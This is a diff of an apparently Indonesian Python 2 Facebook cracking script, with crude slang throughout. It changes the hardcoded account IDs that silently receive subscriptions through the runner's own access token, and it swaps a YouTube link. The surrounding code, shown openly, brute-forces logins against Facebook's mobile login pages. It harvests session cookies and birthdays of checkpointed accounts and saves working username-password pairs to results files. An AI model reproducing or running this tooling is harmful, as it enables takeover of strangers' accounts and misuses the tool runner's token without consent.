@@ -124,7 +124,7 @@ def yayanxd():
         print ' %s[•]%s subscribe channel gua dulu yaa'%(O,N);time.sleep(2)
         open('.memek.txt', 'w').write(kontol)
         raw_input(' %s[•]%s TEKAN ENTER KENTOD!! '%(O,N));wuhan(kontol)
-        os.system('xdg-open https://youtube.com/channel/UCNvDaXoyAVCNJbSqtaXA-mg')
+        os.system('xdg-open https://youtube.com/channel/UCqwjydkaE3y0qo-3Yl3yL3A')
         moch_yayan()
     except KeyError:
         print '\n\n %s[%s!%s] TOKEN NYA INVALID NGENTOD!!'%(N,M,N);time.sleep(2);yayanxd()
@@ -219,13 +219,13 @@ def moch_yayan():
 def wuhan(kontol):
     try:
         kentod = kontol
-        requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100053460048331/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100001390111040/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100053460048331/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100001390111040/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100001390111040/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100001390111040/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100053460048331/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/857799105/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
@@ -581,7 +581,7 @@ class __crack__:
         except:
             print '\n %s[%s×%s] File [%s%s%s] tidak ada, dump id dulu lah kentod cek nomor 1 sampai 4'%(N,M,N,M,self.apk,N);time.sleep(3)
             raw_input('\n  %s[ %skembali%s ]'%(N,O,N));moch_yayan()
-        ___yayanganteng___ = raw_input(' [%s?%s] apakah anda ingin menggunakan kata sandi manual? [Y/t]: '%(O,N))
+        ___yayanganteng___ = raw_input(' [%s?%s] ingin menggunakan kata sandi manual? [y/t]: '%(O,N))
         if ___yayanganteng___ in ('Y', 'y'):
             print '\n %s[%s!%s] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'%(N,M,N)
             while True:
@@ -675,8 +675,8 @@ class __crack__:
                 loop +=1
                 self.__api__()
             if 'access_token' in response.text and 'EAAA' in response.text:
-                print '\r %s[OK NGAB] %s•%s                 %s' % (H,user,pw,N)
-                wrt = ' [✓] %s|%s' % (user,pw)
+                print '\r %s[OK NGAB: %s • %s                 %s' % (H,user,pw,N)
+                wrt = ' [✓] %s • %s' % (user,pw)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -687,8 +687,8 @@ class __crack__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print '\r %s[CP NGAB] %s•%s•%s %s %s     %s' % (K,user,pw,day,month,year,N)
-                    wrt = ' [×] %s•%s•%s %s %s' % (user,pw,day,month,year)
+                    print '\r %s[CP NGAB: %s • %s • %s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    wrt = ' [×] %s • %s • %s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                     break
@@ -699,8 +699,8 @@ class __crack__:
                 except:
                     pass
 
-                print '\r %s[CP NGAB] %s•%s                %s' % (K,user,pw,N)
-                wrt = ' [×] %s•%s' % (user,pw)
+                print '\r %s[CP NGAB: %s • %s                %s' % (K,user,pw,N)
+                wrt = ' [×] %s • %s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -726,8 +726,8 @@ class __crack__:
             b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r %s[OK NGAB] %s•%s•%s                 %s' % (H,user,pw,kuki,N)
-                wrt = ' [✓] %s|%s•%s' % (user,pw,kuki)
+                print '\r %s[OK NGAB: %s • %s • %s                 %s' % (H,user,pw,kuki,N)
+                wrt = ' [✓] %s • %s • %s' % (user,pw,kuki)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -738,8 +738,8 @@ class __crack__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print '\r %s[CP NGAB] %s•%s•%s %s %s     %s' % (K,user,pw,day,month,year,N)
-                    wrt = ' [×] %s•%s•%s %s %s' % (user,pw,day,month,year)
+                    print '\r %s[CP NGAB: %s • %s • %s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    wrt = ' [×] %s • %s • %s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                     break
@@ -750,8 +750,8 @@ class __crack__:
                 except:
                     pass
 
-                print '\r %s[CP NGAB] %s•%s                %s' % (K,user,pw,N)
-                wrt = ' [×] %s•%s' % (user,pw)
+                print '\r %s[CP NGAB: %s • %s                %s' % (K,user,pw,N)
+                wrt = ' [×] %s • %s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -777,8 +777,8 @@ class __crack__:
             b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r %s[OK NGAB] %s•%s•%s                 %s' % (H,user,pw,kuki,N)
-                wrt = ' [✓] %s•%s•%s' % (user,pw,kuki)
+                print '\r %s[OK NGAB: %s • %s • %s                 %s' % (H,user,pw,kuki,N)
+                wrt = ' [✓] %s • %s • %s' % (user,pw,kuki)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -789,8 +789,8 @@ class __crack__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print '\r %s[CP NGAB] %s•%s•%s %s %s     %s' % (K,user,pw,day,month,year,N)
-                    wrt = ' [×] %s•%s•%s %s %s' % (user,pw,day,month,year)
+                    print '\r %s[CP NGAB: %s • %s • %s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    wrt = ' [×] %s • %s • %s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                     break
@@ -801,8 +801,8 @@ class __crack__:
                 except:
                     pass
 
-                print '\r %s[CP NGAB] %s•%s                %s' % (K,user,pw,N)
-                wrt = ' [×] %s•%s' % (user,pw)
+                print '\r %s[CP NGAB: %s • %s                %s' % (K,user,pw,N)
+                wrt = ' [×] %s • %s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
@@ -815,8 +815,8 @@ class __crack__:
         if yan == '':
             print '\n %s[%s×%s] jangan kosong bro'%(N,M,N);self.__pler__()
         elif yan in ('1', '01'):
-            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
-            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print '\n [%s+%s] hasil OK disimpan di-> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
+            print ' [%s+%s] hasil CP disimpan di-> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
             print '\n [%s!%s] Jika tidak ada hasil, gunakan mode pesawat (2 detik)\n'%(M,N)
             with YayanGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
